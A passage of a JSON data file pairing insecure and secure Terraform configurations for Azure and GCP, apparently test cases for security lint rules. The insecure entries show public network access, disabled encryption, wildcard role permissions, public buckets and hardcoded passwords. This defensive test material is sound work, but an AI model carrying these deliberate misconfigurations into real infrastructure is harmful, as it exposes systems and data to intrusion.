    "code": "resource \"azurerm_cosmosdb_account\" \"db\" {\n    name                = \"tfex-cosmos-db-${random_integer.ri.result}\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n    offer_type          = \"Standard\"\n    kind                = \"GlobalDocumentDB\"\n\n    public_network_access_enabled = false\n    enable_automatic_failover = true\n\n    consistency_policy {\n      consistency_level       = \"BoundedStaleness\"\n      max_interval_in_seconds = 10\n      max_staleness_prefix    = 200\n    }\n\n    geo_location {\n      location          = var.failover_location\n      failover_priority = 1\n    }\n\n    geo_location {\n      location          = azurerm_resource_group.rg.location\n      failover_priority = 0\n    }\n\n    key_vault_key_id = \"A versionless Key Vault Key ID for CMK encryption\"\n}",
    "language": "hcl",
    "description": "Azure Cosmos DB - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-cosmosdb-have-cmk\nresource \"azurerm_cosmosdb_account\" \"db\" {\n    name                = \"tfex-cosmos-db-${random_integer.ri.result}\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n    offer_type          = \"Standard\"\n    kind                = \"GlobalDocumentDB\"\n\n    enable_automatic_failover = true\n\n    consistency_policy {\n    consistency_level       = \"BoundedStaleness\"\n    max_interval_in_seconds = 10\n    max_staleness_prefix    = 200\n    }\n\n    geo_location {\n    location          = var.failover_location\n    failover_priority = 1\n    }\n\n    geo_location {\n    location          = azurerm_resource_group.rg.location\n    failover_priority = 0\n    }\n}",
    "language": "hcl",
    "description": "Azure Cosmos DB - no customer-managed key"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_cosmosdb_account\" \"db\" {\n    name                = \"tfex-cosmos-db-${random_integer.ri.result}\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n    offer_type          = \"Standard\"\n    kind                = \"GlobalDocumentDB\"\n\n    enable_automatic_failover = true\n\n    consistency_policy {\n      consistency_level       = \"BoundedStaleness\"\n      max_interval_in_seconds = 10\n      max_staleness_prefix    = 200\n    }\n\n    geo_location {\n      location          = var.failover_location\n      failover_priority = 1\n    }\n\n    geo_location {\n      location          = azurerm_resource_group.rg.location\n      failover_priority = 0\n    }\n\n    key_vault_key_id = \"A versionless Key Vault Key ID for CMK encryption\"\n}",
    "language": "hcl",
    "description": "Azure Cosmos DB - customer-managed key configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-redis-cache-enable-non-ssl-port\nresource \"azurerm_redis_cache\" \"example\" {\n    name                = \"example-cache\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    capacity            = 2\n    family              = \"C\"\n    sku_name            = \"Standard\"\n    enable_non_ssl_port = true\n    minimum_tls_version = \"1.2\"\n    public_network_access_enabled  = true\n    redis_configuration {\n    }\n}",
    "language": "hcl",
    "description": "Azure Redis - non-SSL port enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_redis_cache\" \"example\" {\n    name                = \"example-cache\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    capacity            = 2\n    family              = \"C\"\n    sku_name            = \"Standard\"\n    enable_non_ssl_port = false\n    minimum_tls_version = \"1.2\"\n    public_network_access_enabled  = true\n\n    redis_configuration {\n    }\n}",
    "language": "hcl",
    "description": "Azure Redis - non-SSL port disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-vmencryption-at-host-enabled\nresource \"azurerm_windows_virtual_machine_scale_set\" \"example\" {\n    name                = \"example-vmss\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"Standard_F2\"\n    instances           = 1\n    admin_password      = \"P@55w0rd1234!\"\n    admin_username      = \"adminuser\"\n\n    source_image_reference {\n    publisher = \"MicrosoftWindowsServer\"\n    offer     = \"WindowsServer\"\n    sku       = \"2016-Datacenter-Server-Core\"\n    version   = \"latest\"\n    }\n\n    os_disk {\n    storage_account_type = \"Standard_LRS\"\n    caching              = \"ReadWrite\"\n    }\n\n    network_interface {\n    name    = \"example\"\n    primary = true\n\n    ip_configuration {\n        name      = \"internal\"\n        primary   = true\n        subnet_id = azurerm_subnet.internal.id\n    }\n    }\n}\n\n# ruleid: azure-vmencryption-at-host-enabled\nresource \"azurerm_linux_virtual_machine_scale_set\" \"example\" {\n    name                = \"example-vmss\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"Standard_F2\"\n    instances           = 1\n    admin_password      = \"P@55w0rd1234!\"\n    admin_username      = \"adminuser\"\n    encryption_at_host_enabled = false\n\n    source_image_reference {\n    publisher = \"MicrosoftWindowsServer\"\n    offer     = \"WindowsServer\"\n    sku       = \"2016-Datacenter-Server-Core\"\n    version   = \"latest\"\n    }\n\n    os_disk {\n    storage_account_type = \"Standard_LRS\"\n    caching              = \"ReadWrite\"\n    }\n\n    network_interface {\n    name    = \"example\"\n    primary = true\n\n    ip_configuration {\n        name      = \"internal\"\n        primary   = true\n        subnet_id = azurerm_subnet.internal.id\n    }\n    }\n}",
    "language": "hcl",
    "description": "Azure VM Scale Set - encryption at host disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_windows_virtual_machine_scale_set\" \"example\" {\n    name                = \"example-vmss\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"Standard_F2\"\n    instances           = 1\n    admin_password      = \"P@55w0rd1234!\"\n    admin_username      = \"adminuser\"\n    encryption_at_host_enabled = true\n\n    source_image_reference {\n    publisher = \"MicrosoftWindowsServer\"\n    offer     = \"WindowsServer\"\n    sku       = \"2016-Datacenter-Server-Core\"\n    version   = \"latest\"\n    }\n\n    os_disk {\n    storage_account_type = \"Standard_LRS\"\n    caching              = \"ReadWrite\"\n    }\n\n    network_interface {\n    name    = \"example\"\n    primary = true\n\n    ip_configuration {\n        name      = \"internal\"\n        primary   = true\n        subnet_id = azurerm_subnet.internal.id\n    }\n    }\n}",
    "language": "hcl",
    "description": "Azure VM Scale Set - encryption at host enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-scale-set-password\nresource \"azurerm_linux_virtual_machine_scale_set\" \"example\" {\n    name                = var.scaleset_name\n    resource_group_name = var.resource_group.name\n    location            = var.resource_group.location\n    sku                 = var.sku\n    instances           = var.instance_count\n    admin_username      = var.admin_username\n    disable_password_authentication = false\n    tags = var.common_tags\n}",
    "language": "hcl",
    "description": "Azure Linux VM Scale Set - password authentication enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_linux_virtual_machine_scale_set\" \"example\" {\n    name                = var.scaleset_name\n    resource_group_name = var.resource_group.name\n    location            = var.resource_group.location\n    sku                 = var.sku\n    instances           = var.instance_count\n    admin_username      = var.admin_username\n    disable_password_authentication = true\n\n    admin_ssh_key {\n        username   = var.admin_username\n        public_key = tls_private_key.new.public_key_pem\n    }\n    tags = var.common_tags\n}",
    "language": "hcl",
    "description": "Azure Linux VM Scale Set - SSH key authentication"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-managed-disk-encryption\nresource \"azurerm_managed_disk\" \"fail\" {\n  name                 = var.disk_name\n  location             = var.location\n  resource_group_name  = var.resource_group_name\n  storage_account_type = var.storage_account_type\n  create_option        = \"Empty\"\n  disk_size_gb         = var.disk_size_gb\n  encryption_settings {\n    enabled = false\n  }\n  tags = var.common_tags\n}",
    "language": "hcl",
    "description": "Azure Managed Disk - encryption disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_managed_disk\" \"pass2\" {\n  name                 = var.disk_name\n  location             = var.location\n  resource_group_name  = var.resource_group_name\n  storage_account_type = var.storage_account_type\n  create_option        = \"Empty\"\n  disk_size_gb         = var.disk_size_gb\n  encryption_settings {\n    enabled = true\n  }\n  tags = var.common_tags\n}\n\nresource \"azurerm_managed_disk\" \"pass\" {\n  name                   = \"acctestmd1\"\n  location               = \"West US 2\"\n  resource_group_name    = azurerm_resource_group.example.name\n  storage_account_type   = \"Standard_LRS\"\n  create_option          = \"Empty\"\n  disk_size_gb           = \"1\"\n  disk_encryption_set_id = var.encryption_set_id\n\n  tags = {\n    environment = \"staging\"\n  }\n}",
    "language": "hcl",
    "description": "Azure Managed Disk - encryption enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-containergroup-deployed-into-virtualnetwork\nresource \"azurerm_container_group\" \"example\" {\n    name                = \"example-continst\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    ip_address_type     = \"public\"\n    dns_name_label      = \"aci-label\"\n    os_type             = \"Linux\"\n\n    container {\n    name   = \"hello-world\"\n    image  = \"microsoft/aci-helloworld:latest\"\n    cpu    = \"0.5\"\n    memory = \"1.5\"\n\n    ports {\n        port     = 443\n        protocol = \"TCP\"\n    }\n    }\n\n    container {\n    name   = \"sidecar\"\n    image  = \"microsoft/aci-tutorial-sidecar\"\n    cpu    = \"0.5\"\n    memory = \"1.5\"\n    }\n}",
    "language": "hcl",
    "description": "Azure Container Group - no virtual network"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_container_group\" \"example\" {\n    name                = \"example-continst\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    ip_address_type     = \"public\"\n    dns_name_label      = \"aci-label\"\n    os_type             = \"Linux\"\n\n    container {\n    name   = \"hello-world\"\n    image  = \"microsoft/aci-helloworld:latest\"\n    cpu    = \"0.5\"\n    memory = \"1.5\"\n\n    ports {\n        port     = 443\n        protocol = \"TCP\"\n    }\n    }\n\n    container {\n    name   = \"sidecar\"\n    image  = \"microsoft/aci-tutorial-sidecar\"\n    cpu    = \"0.5\"\n    memory = \"1.5\"\n    }\n\n    network_profile_id = \"network_profile_id\"\n}",
    "language": "hcl",
    "description": "Azure Container Group - deployed into virtual network"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-datafactory-no-public-network-access\nresource \"azurerm_data_factory\" \"example\" {\n    name                = \"example\"\n    location            = \"azurerm_resource_group.example.location\"\n    resource_group_name = \"azurerm_resource_group.example.name\"\n}\n\n# ruleid: azure-datafactory-no-public-network-access\nresource \"azurerm_data_factory\" \"example\" {\n    name                = \"example\"\n    location            = \"azurerm_resource_group.example.location\"\n    resource_group_name = \"azurerm_resource_group.example.name\"\n    public_network_enabled = true\n}",
    "language": "hcl",
    "description": "Azure Data Factory - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_data_factory\" \"example\" {\n    name                = \"example\"\n    location            = \"azurerm_resource_group.example.location\"\n    resource_group_name = \"azurerm_resource_group.example.name\"\n    public_network_enabled = false\n}",
    "language": "hcl",
    "description": "Azure Data Factory - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-datalake-store-encryption\nresource \"azurerm_data_lake_store\" \"example\" {\n    name                = \"consumptiondatalake\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    encryption_state = \"Disabled\"\n}\n\n# ruleid: azure-datalake-store-encryption\nresource \"azurerm_data_lake_store\" \"example\" {\n    name                = \"consumptiondatalake\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n}",
    "language": "hcl",
    "description": "Azure Data Lake Store - encryption disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_data_lake_store\" \"example\" {\n    name                = \"consumptiondatalake\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    encryption_state = \"Enabled\"\n}",
    "language": "hcl",
    "description": "Azure Data Lake Store - encryption enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-iot-no-public-network-access\nresource \"azurerm_iothub\" \"example\" {\n    name                = \"Example-IoTHub\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n\n    sku {\n    name     = \"S1\"\n    capacity = \"1\"\n    }\n\n    endpoint {\n    type                       = \"AzureIotHub.StorageContainer\"\n    connection_string          = azurerm_storage_account.example.primary_blob_connection_string\n    name                       = \"export\"\n    batch_frequency_in_seconds = 60\n    max_chunk_size_in_bytes    = 10485760\n    container_name             = azurerm_storage_container.example.name\n    encoding                   = \"Avro\"\n    file_name_format           = \"{iothub}/{partition}_{YYYY}_{MM}_{DD}_{HH}_{mm}\"\n    }\n\n    public_network_access_enabled = true\n}",
    "language": "hcl",
    "description": "Azure IoT Hub - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_iothub\" \"example\" {\n    name                = \"Example-IoTHub\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n\n    sku {\n    name     = \"S1\"\n    capacity = \"1\"\n    }\n\n    endpoint {\n    type                       = \"AzureIotHub.StorageContainer\"\n    connection_string          = azurerm_storage_account.example.primary_blob_connection_string\n    name                       = \"export\"\n    batch_frequency_in_seconds = 60\n    max_chunk_size_in_bytes    = 10485760\n    container_name             = azurerm_storage_container.example.name\n    encoding                   = \"Avro\"\n    file_name_format           = \"{iothub}/{partition}_{YYYY}_{MM}_{DD}_{HH}_{mm}\"\n    }\n\n    public_network_access_enabled = false\n}",
    "language": "hcl",
    "description": "Azure IoT Hub - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-eventgrid-domain-network-access\nresource \"azurerm_eventgrid_domain\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n}\n\n# ruleid: azure-eventgrid-domain-network-access\nresource \"azurerm_eventgrid_domain\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    public_network_access_enabled = true\n}",
    "language": "hcl",
    "description": "Azure Event Grid - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_eventgrid_domain\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    public_network_access_enabled = false\n}",
    "language": "hcl",
    "description": "Azure Event Grid - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-cognitiveservices-disables-public-network\nresource \"azurerm_cognitive_account\" \"examplea\" {\n  name                = \"example-account\"\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n  kind                = \"Face\"\n  public_network_access_enabled = true\n  sku_name = \"S0\"\n}\n\n# ruleid: azure-cognitiveservices-disables-public-network\nresource \"azurerm_cognitive_account\" \"examplea\" {\n  name                = \"example-account\"\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n  kind                = \"Face\"\n  sku_name = \"S0\"\n}",
    "language": "hcl",
    "description": "Azure Cognitive Services - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_cognitive_account\" \"examplea\" {\n  name                = \"example-account\"\n  location            = var.resource_group.location\n  resource_group_name = var.resource_group.name\n  kind                = \"Face\"\n  public_network_access_enabled = false\n  sku_name = \"S0\"\n}",
    "language": "hcl",
    "description": "Azure Cognitive Services - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-search-publicnetwork-access-disabled\nresource \"azurerm_search_service\" \"example\" {\n    name                = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"standard\"\n    public_network_access_enabled = true\n}\n\n# ruleid: azure-search-publicnetwork-access-disabled\nresource \"azurerm_search_service\" \"example\" {\n    name                = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"standard\"\n}",
    "language": "hcl",
    "description": "Azure Search - public network access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_search_service\" \"example\" {\n    name                = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"standard\"\n    public_network_access_enabled = false\n}",
    "language": "hcl",
    "description": "Azure Search - public network access disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: azure-apiservices-use-virtualnetwork\nresource \"azurerm_api_management\" \"example\" {\n    name                = \"example-apim\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    publisher_name      = \"My Company\"\n    publisher_email     = \"company@terraform.io\"\n\n    sku_name = \"Developer_1\"\n\n    policy {\n    xml_content = <<XML\n    <policies>\n        <inbound />\n        <backend />\n        <outbound />\n        <on-error />\n    </policies>\nXML\n\n    }\n}",
    "language": "hcl",
    "description": "Azure API Management - no virtual network"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_api_management\" \"example\" {\n    name                = \"example-apim\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    publisher_name      = \"My Company\"\n    publisher_email     = \"company@terraform.io\"\n\n    sku_name = \"Developer_1\"\n    virtual_network_configuration {\n    subnet_id = azure_subnet.subnet_not_public_ip.id\n    }\n    policy {\n    xml_content = <<XML\n    <policies>\n        <inbound />\n        <backend />\n        <outbound />\n        <on-error />\n    </policies>\nXML\n\n    }\n}",
    "language": "hcl",
    "description": "Azure API Management - virtual network configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "resource \"azurerm_role_definition\" \"example\" {\n    name        = \"my-custom-role\"\n    scope       = data.azurerm_subscription.primary.id\n    description = \"This is a custom role created via Terraform\"\n\n    permissions {\n    # ruleid: azure-customrole-definition-subscription-owner\n    actions     = [\"*\"]\n    not_actions = []\n    }\n\n    assignable_scopes = [\n    data.azurerm_subscription.primary.id\n    ]\n}",
    "language": "hcl",
    "description": "Azure IAM - custom role with wildcard actions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_role_definition\" \"example\" {\n    name        = \"my-custom-role\"\n    scope       = data.azurerm_subscription.primary.id\n    description = \"This is a custom role created via Terraform\"\n\n    permissions {\n    actions     = [\n    \"Microsoft.Authorization/*/read\",\n        \"Microsoft.Insights/alertRules/*\",\n        \"Microsoft.Resources/deployments/write\",\n        \"Microsoft.Resources/subscriptions/operationresults/read\",\n        \"Microsoft.Resources/subscriptions/read\",\n        \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n        \"Microsoft.Support/*\"\n        ]\n    not_actions = []\n    }\n\n    assignable_scopes = [\n    data.azurerm_subscription.primary.id\n    ]\n}",
    "language": "hcl",
    "description": "Azure IAM - custom role with specific permissions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-storage-bucket-uniform-access\nresource \"google_storage_bucket\" \"default\" {\n  name     = \"example.com\"\n  location = \"EU\"\n}\n\n# ruleid: gcp-storage-bucket-uniform-access\nresource \"google_storage_bucket\" \"disabled\" {\n  name     = \"example\"\n  location = \"EU\"\n  uniform_bucket_level_access = false\n}",
    "language": "hcl",
    "description": "uniform bucket-level access disabled or not set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-storage-bucket-uniform-access\nresource \"google_storage_bucket\" \"enabled\" {\n  name     = \"example\"\n  location = \"EU\"\n  uniform_bucket_level_access = true\n}",
    "language": "hcl",
    "description": "uniform bucket-level access enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-cloud-storage-logging\nresource \"google_storage_bucket\" \"fail\" {\n    name     = \"jgwloggingbucket\"\n    location = var.location\n    uniform_bucket_level_access = true\n}",
    "language": "hcl",
    "description": "logging not configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-cloud-storage-logging\nresource \"google_storage_bucket\" \"success\" {\n    name     = \"jgwloggingbucket\"\n    location = var.location\n    uniform_bucket_level_access = true\n    logging {\n        log_bucket = \"mylovelybucket\"\n    }\n}",
    "language": "hcl",
    "description": "logging configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-storage-bucket-not-public-iam-member\nresource \"google_storage_bucket_iam_member\" \"fail\" {\n    bucket = google_storage_bucket.default.name\n    role = \"roles/storage.admin\"\n    member = \"allUsers\"\n}",
    "language": "hcl",
    "description": "public access via IAM member"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-storage-bucket-not-public-iam-member\nresource \"google_storage_bucket_iam_member\" \"success\" {\n    bucket = google_storage_bucket.default.name\n    role = \"roles/storage.admin\"\n    member = \"user:jane@example.com\"\n}",
    "language": "hcl",
    "description": "access restricted to specific users"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-storage-bucket-not-public-iam-binding\nresource \"google_storage_bucket_iam_binding\" \"fail\" {\n    bucket = google_storage_bucket.default.name\n    role = \"roles/storage.admin\"\n    members = [\n    \"user:jane@example.com\",\n    \"allAuthenticatedUsers\"\n    ]\n}",
    "language": "hcl",
    "description": "public access via IAM binding"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-storage-bucket-not-public-iam-binding\nresource \"google_storage_bucket_iam_binding\" \"success\" {\n    bucket = google_storage_bucket.default.name\n    role = \"roles/storage.admin\"\n    members = [\n    \"user:jane@example.com\"\n    ]\n}",
    "language": "hcl",
    "description": "no public members in binding"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-storage-versioning-enabled\nresource \"google_storage_bucket\" \"fail1\" {\n  name     = \"foo\"\n  location = \"EU\"\n\n  versioning = {\n    enabled = false\n  }\n}\n\n# ruleid: gcp-storage-versioning-enabled\nresource \"google_storage_bucket\" \"fail2\" {\n  name     = \"foo\"\n  location = \"EU\"\n}",
    "language": "hcl",
    "description": "versioning disabled or not set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-storage-versioning-enabled\nresource \"google_storage_bucket\" \"pass\" {\n  name     = \"foo\"\n  location = \"EU\"\n\n  versioning = {\n    enabled = true\n  }\n}",
    "language": "hcl",
    "description": "versioning enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-boot-disk-encryption\nresource \"google_compute_instance\" \"fail\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n}",
    "language": "hcl",
    "description": "no encryption key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-boot-disk-encryption\nresource \"google_compute_instance\" \"success\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {\n        disk_encryption_key_raw = \"acXTX3rxrKAFTF0tYVLvydU1riRZTvUNC4g5I11NY-c=\"\n    }\n}\n\n# ok: gcp-compute-boot-disk-encryption\nresource \"google_compute_instance\" \"success\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {\n        kms_key_self_link = google_kms_crypto_key.example-key.id\n    }\n}",
    "language": "hcl",
    "description": "encryption key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-disk-encryption\nresource \"google_compute_disk\" \"fail\" {\n    name  = \"test-disk\"\n    type  = \"pd-ssd\"\n    zone  = \"us-central1-a\"\n    image = \"debian-8-jessie-v20170523\"\n    physical_block_size_bytes = 4096\n}",
    "language": "hcl",
    "description": "no encryption key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-disk-encryption\nresource \"google_compute_disk\" \"success\" {\n    name  = \"test-disk\"\n    type  = \"pd-ssd\"\n    zone  = \"us-central1-a\"\n    image = \"debian-8-jessie-v20170523\"\n    physical_block_size_bytes = 4096\n    disk_encryption_key {\n        raw_key = \"acXTX3rxrKAFTF0tYVLvydU1riRZTvUNC4g5I11NY-c=\"\n    }\n}\n\n# ok: gcp-compute-disk-encryption\nresource \"google_compute_disk\" \"success\" {\n    name  = \"test-disk\"\n    type  = \"pd-ssd\"\n    zone  = \"us-central1-a\"\n    image = \"debian-8-jessie-v20170523\"\n    physical_block_size_bytes = 4096\n    disk_encryption_key {\n        kms_key_self_link = google_kms_crypto_key.example-key.id\n    }\n}",
    "language": "hcl",
    "description": "encryption key specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-public-ip\nresource \"google_compute_instance\" \"fail\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {\n    auto_delete = true\n  }\n\n  network_interface {\n    network = \"default\"\n    access_config {\n    }\n  }\n}",
    "language": "hcl",
    "description": "public IP via access_config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-public-ip\nresource \"google_compute_instance\" \"pass\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {\n    auto_delete = true\n  }\n  network_interface {\n\n  }\n}",
    "language": "hcl",
    "description": "no access_config block"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-serial-ports\nresource \"google_compute_instance\" \"fail\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    metadata = {\n        serial-port-enable = true\n    }\n}",
    "language": "hcl",
    "description": "serial port enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-serial-ports\nresource \"google_compute_instance\" \"success1\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n}\n\n# ok: gcp-compute-serial-ports\nresource \"google_compute_instance\" \"success2\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    metadata = {\n        serial-port-enable = false\n    }\n}",
    "language": "hcl",
    "description": "serial port not enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-os-login\nresource \"google_compute_instance\" \"fail\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    metadata = {\n        enable-oslogin = false\n    }\n}",
    "language": "hcl",
    "description": "OS Login disabled at instance level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-os-login\nresource \"google_compute_instance\" \"success1\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    metadata = {\n        foo = \"bar\"\n    }\n}\n\n# ok: gcp-compute-os-login\nresource \"google_compute_instance\" \"success2\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    metadata = {\n        enable-oslogin = true\n    }\n}",
    "language": "hcl",
